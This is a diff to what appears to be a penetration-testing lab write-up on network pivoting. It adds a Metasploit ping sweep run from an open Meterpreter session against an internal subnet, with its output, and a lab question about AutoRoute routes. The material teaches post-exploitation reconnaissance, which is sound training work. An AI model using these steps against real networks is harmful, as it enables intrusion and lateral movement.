@@ -195,9 +195,15 @@ This successfully initiated the reverse TCP connection, and we received a Meterp
 [*] Meterpreter session 1 opened (10.10.14.162:8080 -> 10.129.135.184:47350) at 2025-03-03 11:12:38 -0600
 ```
 
+After obtaining the Meterpreter session, I ran a ping sweep on the Ubuntu server to identify other live hosts in the network range:
+```bash
+Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+[*] Performing ping sweep for IP range 172.16.5.0/23
+[+] 172.16.5.19 host found
+[+] 172.16.5.129 host found
+```
 
-
-
+* **Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)**
 
 
 
